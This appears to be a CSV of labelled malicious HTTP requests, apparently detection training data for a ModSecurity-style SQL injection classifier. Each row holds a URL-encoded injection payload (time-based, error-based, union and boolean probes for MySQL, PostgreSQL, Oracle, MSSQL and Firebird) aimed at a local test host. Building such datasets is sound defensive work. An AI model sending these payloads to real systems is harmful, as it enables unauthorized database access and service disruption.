"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_000623","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+as+vdhw+where+8858%3D8858+order+by+1%23","/","p=1%27%29%29+as+vdhw+where+8858%3D8858+order+by+1%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+as+vdhw+where+8858%3D8858+order+by+1%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000624","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+as+vuzt+where+4971%3D4971%3Bselect+count%28%2A%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4--","/","p=1%27%29%29+as+vuzt+where+4971%3D4971%3Bselect+count%28%2A%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+as+vuzt+where+4971%3D4971%3Bselect+count%28%2A%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000625","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+as+xqvq+where+4816%3D4816+or+4240%3D%28select+4240+from+pg_sleep%285%29%29--","/","p=1%27%29%29+as+xqvq+where+4816%3D4816+or+4240%3D%28select+4240+from+pg_sleep%285%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+as+xqvq+where+4816%3D4816+or+4240%3D%28select+4240+from+pg_sleep%285%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000626","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%28%27ytxg%27%3D%27ytxg","/","p=1%27%29%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%28%27ytxg%27%3D%27ytxg","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+or+%28select+%2A+from+%28select%28sleep%285%29%29%29ydpu%29+and+%28%28%27ytxg%27%3D%27ytxg HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000627","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%28%27xtdj%27%3D%27xtdj","/","p=1%27%29%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%28%27xtdj%27%3D%27xtdj","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29+and+%28%28%27xtdj%27%3D%27xtdj HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000628","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+or+4240%3D%28select+4240+from+pg_sleep%285%29%29--","/","p=1%27%29%29+or+4240%3D%28select+4240+from+pg_sleep%285%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+or+4240%3D%28select+4240+from+pg_sleep%285%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000629","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+or+7427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--","/","p=1%27%29%29+or+7427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+or+7427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000630","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27krvo%27+like+%27krvo","/","p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27krvo%27+like+%27krvo","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27krvo%27+like+%27krvo HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000631","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27pemj%27%3D%27pemj","/","p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27pemj%27%3D%27pemj","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+rlike+%28select+%2A+from+%28select%28sleep%285%29%29%29sgvo%29+and+%28%28%27pemj%27%3D%27pemj HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000632","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","/","p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000633","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull--","/","p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+union+all+select+null%2Cnull%2Cnull%2Cnull-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000634","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%29+waitfor+delay+%270%3A0%3A5%27+and+%28%28%27bbqk%27%3D%27bbqk","/","p=1%27%29%29+waitfor+delay+%270%3A0%3A5%27+and+%28%28%27bbqk%27%3D%27bbqk","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%29+waitfor+delay+%270%3A0%3A5%27+and+%28%28%27bbqk%27%3D%27bbqk HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000635","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%3Bcall+regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29+and+%28%27cixa%27+like+%27cixa","/","p=1%27%29%3Bcall+regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29+and+%28%27cixa%27+like+%27cixa","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%3Bcall+regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29+and+%28%27cixa%27+like+%27cixa HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000636","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%3Bselect+count%28%2A%29+from+generate_series%281%2C5000000%29--","/","p=1%27%29%3Bselect+count%28%2A%29+from+generate_series%281%2C5000000%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%3Bselect+count%28%2A%29+from+generate_series%281%2C5000000%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000637","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%3Bselect+dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29+from+dual--","/","p=1%27%29%3Bselect+dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29+from+dual--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%3Bselect+dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29+from+dual-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000638","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29%3Bwaitfor+delay+%270%3A0%3A5%27","/","p=1%27%29%3Bwaitfor+delay+%270%3A0%3A5%27","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29%3Bwaitfor+delay+%270%3A0%3A5%27 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000639","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+3824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29+and+%28%27seyd%27%3D%27seyd","/","p=1%27%29+and+3824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29+and+%28%27seyd%27%3D%27seyd","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+3824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29+and+%28%27seyd%27%3D%27seyd HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000640","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+6055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%286055%3D6055%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29","/","p=1%27%29+and+6055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%286055%3D6055%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+6055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%286055%3D6055%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000641","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+6240%3D%28%27qqpjq%27%7C%7C%28select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29","/","p=1%27%29+and+6240%3D%28%27qqpjq%27%7C%7C%28select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+6240%3D%28%27qqpjq%27%7C%7C%28select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000642","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+6537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29+and+%28%27rgue%27+like+%27rgue","/","p=1%27%29+and+6537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29+and+%28%27rgue%27+like+%27rgue","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+6537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29+and+%28%27rgue%27+like+%27rgue HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000643","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+7290%3D8416+and+%28%27ktlz%27+like+%27ktlz","/","p=1%27%29+and+7290%3D8416+and+%28%27ktlz%27+like+%27ktlz","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+7290%3D8416+and+%28%27ktlz%27+like+%27ktlz HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000644","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27lnte%27%3D%27lnte","/","p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27lnte%27%3D%27lnte","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27lnte%27%3D%27lnte HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000645","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27nxkp%27+like+%27nxkp","/","p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27nxkp%27+like+%27nxkp","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+7756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%287756%3D7756%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%27nxkp%27+like+%27nxkp HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000646","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+8407%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29+and+%28%27lwrk%27+like+%27lwrk","/","p=1%27%29+and+8407%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29+and+%28%27lwrk%27+like+%27lwrk","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+8407%3D%28select+count%28%2A%29+from+generate_series%281%2C5000000%29%29+and+%28%27lwrk%27+like+%27lwrk HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000647","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29","/","p=1%27%29+and+char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000648","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29+and+%28%27qutm%27%3D%27qutm","/","p=1%27%29+and+char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29+and+%28%27qutm%27%3D%27qutm","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29+and+%28%27qutm%27%3D%27qutm HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000649","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+elt%284249%3D4249%2C7259%29","/","p=1%27%29+and+elt%284249%3D4249%2C7259%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+elt%284249%3D4249%2C7259%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000650","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+make_set%288403%3D8403%2C8899%29","/","p=1%27%29+and+make_set%288403%3D8403%2C8899%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+make_set%288403%3D8403%2C8899%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000651","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+make_set%289961%3D6559%2C6559%29+and+%28%27exde%27%3D%27exde","/","p=1%27%29+and+make_set%289961%3D6559%2C6559%29+and+%28%27exde%27%3D%27exde","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+make_set%289961%3D6559%2C6559%29+and+%28%27exde%27%3D%27exde HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000652","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1%27%29+and+updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select+%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29+and+%28%27ngxz%27%3D%27ngxz","/","p=1%27%29+and+updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select+%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29+and+%28%27ngxz%27%3D%27ngxz","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1%27%29+and+updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select+%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29+and+%28%27ngxz%27%3D%27ngxz HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
